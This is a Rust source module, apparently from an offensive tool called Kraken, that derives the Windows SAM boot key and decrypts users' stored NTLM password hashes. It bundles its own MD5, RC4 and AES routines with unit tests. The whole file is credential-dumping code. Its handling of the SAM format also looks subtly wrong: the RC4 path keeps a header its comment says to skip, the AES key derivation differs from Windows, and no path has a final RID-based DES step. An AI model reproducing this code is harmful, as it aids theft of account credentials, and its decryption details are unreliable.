//! SAM crypto operations: boot key derivation and hash decryption
//!
//! Windows SAM stores NTLM hashes encrypted with a key derived from the boot
//! key. Two encryption schemes exist:
//!
//! - **RC4** (pre-Vista / older): `nt_len == 20` in the V value header
//! - **AES-CBC** (Vista+): `nt_len == 56` in the V value header
//!
//! ## Key Derivation (both schemes)
//! ```text
//! hashed_boot_key = MD5(boot_key || F_value[0x70..0x80] || "NLKT\0\0\0\0" || F_value[0x70..0x80])
//! per_user_key    = MD5(hashed_boot_key || RID_LE_bytes || "NTPASSWORD\0")
//! ```
//!
//! The NTLM hash is then decrypted with RC4(per_user_key) or
//! AES-128-CBC(per_user_key[0..16], iv=V_value[..16]).
//!
//! ## OPSEC
//! Sensitive key material is zeroed after use via `zeroize_slice`.

use crate::KrakenError;

// ──────────────────────────────────────────────────────────────────────────────
// Minimal pure-Rust MD5 (no external crate required)
// ──────────────────────────────────────────────────────────────────────────────

/// Compute MD5 over a sequence of byte slices.
fn md5(parts: &[&[u8]]) -> [u8; 16] {
    // Collect all input into one buffer
    let mut input = Vec::new();
    for part in parts {
        input.extend_from_slice(part);
    }
    md5_digest(&input)
}

/// Pure-Rust MD5 digest (RFC 1321).
fn md5_digest(msg: &[u8]) -> [u8; 16] {
    // Per-round shift amounts
    const S: [u32; 64] = [
        7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,
        5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,
        4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,
        6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,
    ];

    // Precomputed table: floor(2^32 * |sin(i+1)|)
    const K: [u32; 64] = [
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
        0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
        0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
        0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
        0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
        0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
        0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
        0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
        0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
        0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
        0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
        0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
        0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
        0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
    ];

    let mut a0: u32 = 0x67452301;
    let mut b0: u32 = 0xefcdab89;
    let mut c0: u32 = 0x98badcfe;
    let mut d0: u32 = 0x10325476;

    // Pre-processing: pad message
    let orig_len_bits = (msg.len() as u64).wrapping_mul(8);
    let mut padded = msg.to_vec();
    padded.push(0x80);
    while padded.len() % 64 != 56 {
        padded.push(0x00);
    }
    padded.extend_from_slice(&orig_len_bits.to_le_bytes());

    // Process each 512-bit chunk
    for chunk in padded.chunks_exact(64) {
        let mut m = [0u32; 16];
        for (i, w) in m.iter_mut().enumerate() {
            *w = u32::from_le_bytes(chunk[i * 4..i * 4 + 4].try_into().unwrap());
        }

        let (mut a, mut b, mut c, mut d) = (a0, b0, c0, d0);

        for i in 0usize..64 {
            let (f, g): (u32, usize) = match i {
                0..=15  => ((b & c) | ((!b) & d),           i),
                16..=31 => ((d & b) | ((!d) & c),           (5 * i + 1) % 16),
                32..=47 => (b ^ c ^ d,                      (3 * i + 5) % 16),
                _       => (c ^ (b | (!d)),                 (7 * i) % 16),
            };
            let f = f
                .wrapping_add(a)
                .wrapping_add(K[i])
                .wrapping_add(m[g]);
            a = d;
            d = c;
            c = b;
            b = b.wrapping_add(f.rotate_left(S[i]));
        }

        a0 = a0.wrapping_add(a);
        b0 = b0.wrapping_add(b);
        c0 = c0.wrapping_add(c);
        d0 = d0.wrapping_add(d);
    }

    let mut digest = [0u8; 16];
    digest[0..4].copy_from_slice(&a0.to_le_bytes());
    digest[4..8].copy_from_slice(&b0.to_le_bytes());
    digest[8..12].copy_from_slice(&c0.to_le_bytes());
    digest[12..16].copy_from_slice(&d0.to_le_bytes());
    digest
}

// ──────────────────────────────────────────────────────────────────────────────
// Minimal pure-Rust RC4
// ──────────────────────────────────────────────────────────────────────────────

fn rc4(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut s: Vec<u8> = (0..=255u8).collect();
    let mut j: usize = 0;

    // KSA
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }

    // PRGA
    let mut i = 0usize;
    let mut j = 0usize;
    let mut out = Vec::with_capacity(data.len());
    for &byte in data {
        i = (i + 1) % 256;
        j = (j + s[i] as usize) % 256;
        s.swap(i, j);
        out.push(byte ^ s[(s[i] as usize + s[j] as usize) % 256]);
    }
    out
}

// ──────────────────────────────────────────────────────────────────────────────
// Minimal pure-Rust AES-128-CBC decrypt
// ──────────────────────────────────────────────────────────────────────────────

fn aes128_cbc_decrypt(key: &[u8; 16], iv: &[u8; 16], ciphertext: &[u8]) -> Vec<u8> {
    let round_keys = aes128_key_expansion(key);
    let mut plaintext = Vec::with_capacity(ciphertext.len());
    let mut prev_block = *iv;

    for block in ciphertext.chunks_exact(16) {
        let mut state = [0u8; 16];
        state.copy_from_slice(block);
        aes128_decrypt_block(&mut state, &round_keys);
        for (p, &c) in state.iter_mut().zip(prev_block.iter()) {
            *p ^= c;
        }
        plaintext.extend_from_slice(&state);
        prev_block.copy_from_slice(block);
    }
    plaintext
}

// AES-128 key expansion → 11 round keys of 16 bytes each
fn aes128_key_expansion(key: &[u8; 16]) -> [[u8; 16]; 11] {
    const RCON: [u8; 10] = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36];

    let mut w = [[0u8; 4]; 44];
    for i in 0..4 {
        w[i].copy_from_slice(&key[i*4..i*4+4]);
    }
    for i in 4..44 {
        let mut temp = w[i-1];
        if i % 4 == 0 {
            // RotWord
            let t = temp[0];
            temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
            // SubWord
            for b in temp.iter_mut() { *b = AES_SBOX[*b as usize]; }
            temp[0] ^= RCON[i/4 - 1];
        }
        for j in 0..4 { w[i][j] = w[i-4][j] ^ temp[j]; }
    }

    let mut round_keys = [[0u8; 16]; 11];
    for (r, rk) in round_keys.iter_mut().enumerate() {
        for j in 0..4 {
            rk[j*4..j*4+4].copy_from_slice(&w[r*4+j]);
        }
    }
    round_keys
}

fn aes128_decrypt_block(state: &mut [u8; 16], round_keys: &[[u8; 16]; 11]) {
    add_round_key(state, &round_keys[10]);
    for round in (1..10).rev() {
        inv_shift_rows(state);
        inv_sub_bytes(state);
        add_round_key(state, &round_keys[round]);
        inv_mix_columns(state);
    }
    inv_shift_rows(state);
    inv_sub_bytes(state);
    add_round_key(state, &round_keys[0]);
}

fn add_round_key(state: &mut [u8; 16], rk: &[u8; 16]) {
    for (s, &k) in state.iter_mut().zip(rk.iter()) { *s ^= k; }
}

fn inv_sub_bytes(state: &mut [u8; 16]) {
    for b in state.iter_mut() { *b = AES_INV_SBOX[*b as usize]; }
}

fn inv_shift_rows(state: &mut [u8; 16]) {
    // Row 1: right shift by 1
    let t = state[13]; state[13] = state[9]; state[9] = state[5]; state[5] = state[1]; state[1] = t;
    // Row 2: right shift by 2
    state.swap(2, 10); state.swap(6, 14);
    // Row 3: right shift by 3 (= left shift by 1)
    let t = state[3]; state[3] = state[7]; state[7] = state[11]; state[11] = state[15]; state[15] = t;
}

fn inv_mix_columns(state: &mut [u8; 16]) {
    for col in 0..4 {
        let i = col * 4;
        let (s0, s1, s2, s3) = (state[i], state[i+1], state[i+2], state[i+3]);
        state[i]   = gf_mul(0x0e, s0) ^ gf_mul(0x0b, s1) ^ gf_mul(0x0d, s2) ^ gf_mul(0x09, s3);
        state[i+1] = gf_mul(0x09, s0) ^ gf_mul(0x0e, s1) ^ gf_mul(0x0b, s2) ^ gf_mul(0x0d, s3);
        state[i+2] = gf_mul(0x0d, s0) ^ gf_mul(0x09, s1) ^ gf_mul(0x0e, s2) ^ gf_mul(0x0b, s3);
        state[i+3] = gf_mul(0x0b, s0) ^ gf_mul(0x0d, s1) ^ gf_mul(0x09, s2) ^ gf_mul(0x0e, s3);
    }
}

/// Galois Field (GF(2^8)) multiplication with reduction poly 0x11b
fn gf_mul(mut a: u8, mut b: u8) -> u8 {
    let mut p = 0u8;
    for _ in 0..8 {
        if b & 1 != 0 { p ^= a; }
        let hi = a & 0x80;
        a <<= 1;
        if hi != 0 { a ^= 0x1b; }
        b >>= 1;
    }
    p
}

// AES S-box and inverse S-box
const AES_SBOX: [u8; 256] = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
];

const AES_INV_SBOX: [u8; 256] = [
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,
];

// ──────────────────────────────────────────────────────────────────────────────
// Zero memory helper
// ──────────────────────────────────────────────────────────────────────────────

/// Overwrite a slice with zeroes. Uses `write_volatile` to prevent
/// compiler optimisation from eliding the zeroing.
pub fn zeroize_slice(buf: &mut [u8]) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b, 0u8); }
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Public API
// ──────────────────────────────────────────────────────────────────────────────

/// Derive the hashed boot key from the boot key and the SAM F value.
///
/// `f_value` is the raw binary content of `SAM\SAM\Domains\Account\F`.
/// Bytes `[0x70..0x80]` are used as the salt.
///
/// ```text
/// hashed_boot_key = MD5(boot_key || f_value[0x70..0x80] || "NLKT\0\0\0\0" || f_value[0x70..0x80])
/// ```
pub fn derive_sam_key(boot_key: &[u8; 16], f_value: &[u8]) -> Result<[u8; 16], KrakenError> {
    if f_value.len() < 0x80 {
        return Err(KrakenError::Module(format!(
            "SAM F value too short: {} bytes (need ≥ 128)",
            f_value.len()
        )));
    }

    let salt = &f_value[0x70..0x80];
    // Constant used in Windows key derivation
    const CONSTANT: &[u8] = b"NLKT\x00\x00\x00\x00";

    let digest = md5(&[boot_key, salt, CONSTANT, salt]);
    Ok(digest)
}

/// Decrypt the NTLM hash for a user from the SAM V value.
///
/// `v_value`         – raw binary content of the user's V value
/// `hashed_boot_key` – output of `derive_sam_key`
/// `rid`             – relative identifier (numeric user ID, e.g. 500 for Administrator)
///
/// Returns the 16-byte NTLM hash on success.
pub fn decrypt_sam_hash(
    v_value: &[u8],
    hashed_boot_key: &[u8; 16],
    rid: u32,
) -> Result<[u8; 16], KrakenError> {
    // The V value layout:
    //   0x00..0x04 – version
    //   0xA8       – offset to NT hash block (relative to 0xCC)
    //   0xAC       – length of NT hash block
    //
    // Minimum length check: need at least 0xCC + 4 bytes for the offset field
    if v_value.len() < 0xCC {
        return Err(KrakenError::Module(format!(
            "V value too short: {} bytes",
            v_value.len()
        )));
    }

    // NT hash block offset (from 0xCC) and length
    let nt_offset = u32::from_le_bytes(v_value[0xA8..0xAC].try_into().unwrap()) as usize + 0xCC;
    let nt_len    = u32::from_le_bytes(v_value[0xAC..0xB0].try_into().unwrap()) as usize;

    if nt_len == 0 {
        return Err(KrakenError::Module("NT hash block is empty (no password set?)".into()));
    }

    if v_value.len() < nt_offset + nt_len {
        return Err(KrakenError::Module(format!(
            "V value too short for NT hash block: need {} bytes, have {}",
            nt_offset + nt_len,
            v_value.len()
        )));
    }

    let rid_le = rid.to_le_bytes();

    if nt_len == 20 {
        // ── RC4 path (pre-Vista) ──────────────────────────────────────────────
        //
        // per_user_key = MD5(hashed_boot_key || RID_LE || "NTPASSWORD\0")
        // plaintext    = RC4(per_user_key, v_value[nt_offset..nt_offset+16])
        // The first 4 bytes of the block are the header; hash starts at +4.
        let hash_block = &v_value[nt_offset..nt_offset + 16];

        let mut per_user_key =
            md5(&[hashed_boot_key, &rid_le, b"NTPASSWORD\x00"]);

        let decrypted = rc4(&per_user_key, hash_block);
        zeroize_slice(&mut per_user_key);

        if decrypted.len() < 16 {
            return Err(KrakenError::Module("RC4 output too short".into()));
        }
        let mut result = [0u8; 16];
        result.copy_from_slice(&decrypted[..16]);
        Ok(result)

    } else if nt_len == 56 {
        // ── AES-CBC path (Vista+) ─────────────────────────────────────────────
        //
        // Layout of the 56-byte block:
        //   [0..4]   – header / version (0x00000001)
        //   [4..20]  – IV (16 bytes)
        //   [20..56] – encrypted data (32 bytes; NTLM hash + padding)
        //
        // per_user_key = MD5(hashed_boot_key || RID_LE || "NTPASSWORD\0")
        // plaintext    = AES-128-CBC(per_user_key[0..16], IV, encrypted_data)
        let block = &v_value[nt_offset..nt_offset + 56];

        let mut iv = [0u8; 16];
        iv.copy_from_slice(&block[4..20]);

        let encrypted = &block[20..56]; // 32 bytes (two AES blocks → 32B plaintext)

        let mut per_user_key =
            md5(&[hashed_boot_key, &rid_le, b"NTPASSWORD\x00"]);

        let mut key16 = [0u8; 16];
        key16.copy_from_slice(&per_user_key[..16]);

        let decrypted = aes128_cbc_decrypt(&key16, &iv, encrypted);
        zeroize_slice(&mut per_user_key);
        zeroize_slice(&mut key16);

        if decrypted.len() < 16 {
            return Err(KrakenError::Module("AES decryption output too short".into()));
        }
        let mut result = [0u8; 16];
        result.copy_from_slice(&decrypted[..16]);
        Ok(result)

    } else {
        Err(KrakenError::Module(format!(
            "Unknown NT hash block length: {} (expected 20 or 56)",
            nt_len
        )))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── MD5 ──────────────────────────────────────────────────────────────────

    #[test]
    fn test_md5_empty() {
        // MD5("") = d41d8cd98f00b204e9800998ecf8427e
        let digest = md5_digest(b"");
        let hex: String = digest.iter().map(|b| format!("{:02x}", b)).collect();
        assert_eq!(hex, "d41d8cd98f00b204e9800998ecf8427e");
    }

    #[test]
    fn test_md5_abc() {
        // MD5("abc") = 900150983cd24fb0d6963f7d28e17f72
        let digest = md5_digest(b"abc");
        let hex: String = digest.iter().map(|b| format!("{:02x}", b)).collect();
        assert_eq!(hex, "900150983cd24fb0d6963f7d28e17f72");
    }

    #[test]
    fn test_md5_quick_brown_fox() {
        // Well-known MD5 test vector
        let digest = md5_digest(b"The quick brown fox jumps over the lazy dog");
        let hex: String = digest.iter().map(|b| format!("{:02x}", b)).collect();
        assert_eq!(hex, "9e107d9d372bb6826bd81d3542a419d6");
    }

    // ── RC4 ──────────────────────────────────────────────────────────────────

    #[test]
    fn test_rc4_known_vector() {
        // RC4("Key", "Plaintext") = BBF316E8D940AF0AD3 (first 9 bytes)
        let key = b"Key";
        let plain = b"Plaintext";
        let cipher = rc4(key, plain);
        assert_eq!(cipher[0], 0xBB);
        assert_eq!(cipher[1], 0xF3);
        assert_eq!(cipher[2], 0x16);
    }

    #[test]
    fn test_rc4_decrypt_encrypt_roundtrip() {
        let key = b"test_key_32bytes_padding_here___";
        let plain = b"Hello, SAM hash decryption test!";
        let cipher = rc4(key, plain);
        let recovered = rc4(key, &cipher);
        assert_eq!(&recovered[..], plain);
    }

    // ── AES-128 ───────────────────────────────────────────────────────────────

    #[test]
    fn test_aes128_known_vector() {
        // NIST FIPS 197 Appendix B
        let key: [u8; 16] = [
            0x2b,0x7e,0x15,0x16,0x28,0xae,0xd2,0xa6,
            0xab,0xf7,0x15,0x88,0x09,0xcf,0x4f,0x3c,
        ];
        let iv = [0u8; 16];
        let ciphertext: [u8; 16] = [
            0x39,0x25,0x84,0x1d,0x02,0xdc,0x09,0xfb,
            0xdc,0x11,0x85,0x97,0x19,0x6a,0x0b,0x32,
        ];
        let plaintext = aes128_cbc_decrypt(&key, &iv, &ciphertext);
        // Known AES-128 ECB plaintext for this ciphertext (CBC with zero IV = ECB for single block)
        let expected: [u8; 16] = [
            0x32,0x43,0xf6,0xa8,0x88,0x5a,0x30,0x8d,
            0x31,0x31,0x98,0xa2,0xe0,0x37,0x07,0x34,
        ];
        assert_eq!(&plaintext[..16], &expected);
    }

    // ── derive_sam_key ────────────────────────────────────────────────────────

    #[test]
    fn test_derive_sam_key_short_f_value() {
        let boot_key = [0u8; 16];
        let f_value = vec![0u8; 64]; // too short
        let result = derive_sam_key(&boot_key, &f_value);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("too short"));
    }

    #[test]
    fn test_derive_sam_key_deterministic() {
        let boot_key = [0x42u8; 16];
        let mut f_value = vec![0u8; 0x80];
        // Set salt bytes 0x70..0x80
        for i in 0..16 {
            f_value[0x70 + i] = i as u8;
        }
        let k1 = derive_sam_key(&boot_key, &f_value).unwrap();
        let k2 = derive_sam_key(&boot_key, &f_value).unwrap();
        assert_eq!(k1, k2);
    }

    // ── decrypt_sam_hash ──────────────────────────────────────────────────────

    #[test]
    fn test_decrypt_sam_hash_short_v_value() {
        let hbk = [0u8; 16];
        let result = decrypt_sam_hash(&[0u8; 10], &hbk, 500);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("too short"));
    }

    #[test]
    fn test_decrypt_sam_hash_empty_nt_block() {
        let hbk = [0u8; 16];
        // Build a V value where nt_len == 0
        let v = vec![0u8; 0xCC + 8];
        // nt_offset at 0xA8: 0
        // nt_len at 0xAC: 0
        let result = decrypt_sam_hash(&v, &hbk, 500);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_sam_hash_unknown_length() {
        let hbk = [0u8; 16];
        let mut v = vec![0u8; 0xCC + 100];
        // nt_offset = 0, nt_len = 42 (invalid)
        v[0xAC..0xB0].copy_from_slice(&42u32.to_le_bytes());
        let result = decrypt_sam_hash(&v, &hbk, 500);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Unknown NT hash block length"));
    }

    // ── zeroize ───────────────────────────────────────────────────────────────

    #[test]
    fn test_zeroize_slice() {
        let mut buf = vec![0xABu8; 32];
        zeroize_slice(&mut buf);
        assert!(buf.iter().all(|&b| b == 0));
    }

    // ── RC4 SAM hash round-trip (synthetic) ───────────────────────────────────

    #[test]
    fn test_rc4_sam_hash_roundtrip() {
        // Simulate what SAM encryption does: encrypt known NTLM hash,
        // then verify decrypt_sam_hash recovers it.
        let hashed_boot_key = [0x11u8; 16];
        let rid: u32 = 1000;
        let rid_le = rid.to_le_bytes();

        // Build per-user key the same way the code does
        let per_user_key = md5(&[&hashed_boot_key, &rid_le as &[u8], b"NTPASSWORD\x00"]);

        // "Encrypt" a known NTLM hash with RC4
        let known_ntlm = [
            0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,
            0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,
        ];
        let encrypted_hash = rc4(&per_user_key, &known_ntlm);

        // Build a synthetic V value with nt_len == 20 (RC4 path)
        // nt_offset (stored at 0xA8) = 0  →  actual offset = 0 + 0xCC = 0xCC
        // nt_len    (stored at 0xAC) = 20
        let total = 0xCC + 20;
        let mut v = vec![0u8; total];
        v[0xAC..0xB0].copy_from_slice(&20u32.to_le_bytes());
        v[0xCC..0xCC + 16].copy_from_slice(&encrypted_hash);

        let recovered = decrypt_sam_hash(&v, &hashed_boot_key, rid).unwrap();
        assert_eq!(recovered, known_ntlm);
    }
}
